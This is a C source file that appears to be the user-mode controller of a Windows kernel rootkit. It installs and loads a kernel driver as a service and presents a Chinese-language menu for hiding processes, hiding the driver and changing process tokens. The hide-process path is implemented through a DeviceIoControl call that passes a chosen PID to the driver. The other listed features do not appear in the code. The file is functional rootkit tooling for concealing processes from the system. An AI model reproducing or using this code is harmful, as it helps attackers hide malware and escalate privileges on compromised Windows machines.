#define _CRT_SECURE_NO_WARNINGS

#include "define.h"
#include "dbgmsg.h"
#include "ntstatus.h"
int setDeviceHandle(LPHANDLE pHandle)
{
	*pHandle = CreateFile
	(
		UserlandPath,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (*pHandle == INVALID_HANDLE_VALUE)
	{
		DBG_PRINT2("[setDeviceHandle]: handle to %s not valid\n", UserlandPath);
		return STATUS_FAILED;
	}
	DBG_TRACE("setDeviceHandle", "device file handle acquired");
	return STATUS_SUCCESS;
}

int hidePID(HANDLE hDeviceFile,DWORD pid)
{
	BOOL opStatus = TRUE;
	DWORD bytesRead = 0;

	opStatus = DeviceIoControl
	(
		hDeviceFile,
		(DWORD)IOCTL_TEST_HIDEME,
		(LPVOID)&pid,
		sizeof(DWORD),
		NULL,
		0,
		&bytesRead,
		NULL
	);
	if (opStatus == FALSE)
	{
		DBG_TRACE("Hide Process", "DeviceIoControl() FAILED");
	}
	return STATUS_SUCCESS;
}

BOOL unloadDriver(SC_HANDLE svcHandle)
{
	SERVICE_STATUS svrSta;
	if (!ControlService(svcHandle, SERVICE_STOP, &svrSta)) {
		DBG_TRACE("onUnloadDriver", "could not stop driver");
		DBG_PRINT2("LastErrorCode:%d\n", GetLastError());
		return FALSE;
	}
	if (!DeleteService(svcHandle)) {
		DBG_TRACE("onUnloadDriver", "could not delete driver");
		return FALSE;
	}
	return TRUE;
}

SC_HANDLE installDriver(LPCTSTR driverName, LPCTSTR binaryPath)
{
	SC_HANDLE scmDBHandle = NULL;
	SC_HANDLE svcHandle = NULL;

	scmDBHandle = OpenSCManager
	(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);
	if (NULL == scmDBHandle)
	{
		DBG_TRACE("installDriver", "coult not open handle to SCM database");
		return NULL;
	}

	svcHandle = CreateService
	(
		scmDBHandle,
		driverName,
		driverName,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		binaryPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (svcHandle == NULL) {
		if (GetLastError() == ERROR_SERVICE_EXISTS) {
			DBG_TRACE("installDriver", "driver already installed");
			svcHandle = OpenService(scmDBHandle, driverName, SERVICE_ALL_ACCESS);
			if (svcHandle == NULL) {
				DBG_TRACE("installDriver", "could not open handle to driver");
				CloseServiceHandle(scmDBHandle);
				return NULL;
			}
			CloseServiceHandle(scmDBHandle);
			return svcHandle;
		}
		DBG_TRACE("installDriver", "could not open handle to driver");
		CloseServiceHandle(scmDBHandle);
		return NULL;
	}

	DBG_TRACE("installDriver", "function returning successful");
	CloseServiceHandle(scmDBHandle);
	return svcHandle;
}

BOOL loadDriver(SC_HANDLE svcHandle)
{
	if (StartService(svcHandle, 0, NULL) == 0) {
		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
			DBG_TRACE("loadDriver", "driver alread running");
			return TRUE;
		}
		else {
			DBG_TRACE("loadDriver", "failed to load driver");
			return FALSE;
		}
	}

	DBG_TRACE("loadDriver", "driver loaded successfully");
	return TRUE;
}

void getPath(LPCSTR path)
{
	GetCurrentDirectory(MAX_PATH, path);
	strncat(path, "\\", MAX_PATH - strlen(path));
	strncat(path, DIRVER_FILE_NAME, MAX_PATH - strlen(path));
}

int main()
{
	LPCSTR binaryPath;
	SC_HANDLE svcHandle;
	binaryPath = (LPCSTR)malloc(MAX_PATH);
	memset(binaryPath, 0, MAX_PATH);
	getPath(binaryPath);

	svcHandle = installDriver(DRIVER_NAME, binaryPath);
	if (svcHandle == NULL) {
		DBG_TRACE("onMain", "could not open SCM");
		return -1;
	}

	if (!loadDriver(svcHandle)) {
		DBG_TRACE("onMain", "could not load driver");
		return -1;
	}

	while (1) {
		int n;
		printf("请输入功能：\n0. 卸载驱动并退出\n1. 隐藏进程\n2. 隐藏内核驱动\n3. 更改进程Token\n");
		scanf("%d", &n);
		switch (n) {
		case 0:
		{
			printf("正在卸载驱动……\n");
			if (!unloadDriver(svcHandle)) {
				return -1;
			}
			printf("正在退出程序\n");
			CloseServiceHandle(svcHandle);
			free(binaryPath);
			return 0;
		}

		case 1:
		{
			BOOL opStatus = TRUE;
			int retCode = STATUS_SUCCESS;
			HANDLE hDeviceFile = INVALID_HANDLE_VALUE;
			DWORD pid;

			printf("请输入要隐藏的PID：");
			scanf("%d", &pid);
			
			retCode = setDeviceHandle(&hDeviceFile);
			if (retCode != STATUS_SUCCESS) {
				DBG_TRACE("onMain", "could not set device handle");
				return -1;
			}
			retCode = hidePID(hDeviceFile,pid);
			if (retCode != STATUS_SUCCESS) {
				DBG_TRACE("onMain", "could not hide process");
				return -1;
			}
		}

		default:
		{
			printf("您的输入有误\n");
		}
		}
	}

}